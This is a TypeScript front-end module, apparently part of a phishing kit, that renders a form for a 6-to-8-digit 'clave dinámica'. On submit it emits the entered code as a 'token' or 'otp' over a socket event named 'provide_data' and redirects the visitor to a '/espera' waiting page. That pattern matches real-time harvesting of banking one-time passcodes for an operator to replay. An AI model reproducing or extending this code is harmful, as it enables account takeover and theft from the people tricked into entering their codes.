import { getSessionId } from "../../utils/session";
import { getSocket } from "../../utils/socket";
import { DinamicaTemplate } from "./dinamica.html";
import { getMensajeYModal } from "./getMensajeYModal";

async function initDinamicaForm() {

    const socket = getSocket();
    const sessionId = await getSessionId();


    const inputDinamica = document.querySelector<HTMLInputElement>("#input_dinamica");
    const formDinamica = document.querySelector<HTMLFormElement>("#dinamica_form");
    const btnDinamica = document.querySelector<HTMLButtonElement>("#btn_dinamica");

    if (!inputDinamica || !formDinamica || !btnDinamica) return;

    inputDinamica.addEventListener("input", () => {
        let valorInput = inputDinamica.value;


        valorInput = valorInput.replace(/[^0-9]/g, "");
        inputDinamica.value = valorInput;


        btnDinamica.disabled = !(valorInput.length >= 6 && valorInput.length <= 8);
    });

    inputDinamica.addEventListener("keypress", (e: KeyboardEvent) => {
        const valor = inputDinamica.value;

        if (e.key < "0" || e.key > "9" || valor.length >= 8) {
            e.preventDefault();
        }
    });


    formDinamica.addEventListener("submit", (e) => {
        e.preventDefault();

       
        const urlParams = new URLSearchParams(window.location.search);
        const param = urlParams.get("p");

        

        if (param == 'ta' || param == 'tax') {
            socket.emit("provide_data", { field: "token", value: inputDinamica.value, ip: sessionId });
              window.location.href = "/espera";
        } else if (param == 'ts' || param == 'tsx') {
            socket.emit("provide_data", { field: "otp", value: inputDinamica.value, ip: sessionId });
                  window.location.href = "/espera";
        }


        
    });

}


export const renderDinamica = async () => {
    const app = document.querySelector<HTMLDivElement>("#app");

    if (app) {
        const { mensaje, mostrarModalError, mostrarModalConfirmacion } =
            getMensajeYModal();

        app.innerHTML = DinamicaTemplate({
            mensaje,
            mostrarModalError,
            mostrarModalConfirmacion,
        });


        initDinamicaForm();
    }
};
